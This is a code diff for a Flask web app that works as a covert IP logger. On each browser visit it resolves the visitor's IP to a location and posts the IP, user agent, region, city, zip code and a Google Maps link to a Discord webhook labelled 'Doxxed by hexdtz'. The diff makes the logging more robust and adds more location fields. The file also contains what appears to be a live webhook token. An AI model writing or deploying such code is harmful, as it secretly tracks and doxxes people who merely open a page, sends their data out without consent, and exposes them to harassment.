@@ -4,21 +4,22 @@ import json
 from datetime import datetime
 
 app = Flask(__name__)
-
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
 
 logged_ips = set()
 
 def get_real_ip():
     xff = request.headers.get("X-Forwarded-For", "")
-    ip_list = xff.split(",")
-    real_ip = ip_list[0].strip() if ip_list else request.remote_addr
-    return real_ip
+    ip = xff.split(",")[0].strip() if xff else request.remote_addr
+    return ip
 
 def get_visitor_info(ip, user_agent):
     try:
-        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
-        details = r.json()
+        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
+        if r.status_code == 200:
+            details = r.json()
+        else:
+            details = {}
     except Exception:
         details = {}
 
@@ -38,7 +39,7 @@ def get_visitor_info(ip, user_agent):
 
 def send_to_discord(info):
     flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
-    ip_city = f"{info['ip']} ({info['city']})"
+    ip_city = f"{info['ip']} ({info['city'] or 'Unknown City'})"
 
     embed = {
         "username": "Doxxed by hexdtz",
@@ -49,7 +50,8 @@ def send_to_discord(info):
             "fields": [
                 {"name": "IP & City", "value": ip_city, "inline": True},
                 {"name": "User Agent", "value": info["user_agent"], "inline": False},
-                {"name": "Region | Zip", "value": f"{info['region']} | {info['zip']}", "inline": True},
+                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
+                {"name": "Region | City | Zip", "value": f"{info['region']} | {info['city']} | {info['zip']}", "inline": True},
                 {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
             ],
             "footer": {
@@ -67,7 +69,6 @@ def index():
     ip = get_real_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
 
-    # Only log once per IP per server session
     if ip not in logged_ips and "Mozilla" in user_agent:
         logged_ips.add(ip)
         info = get_visitor_info(ip, user_agent)
@@ -77,4 +78,3 @@ def index():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
-
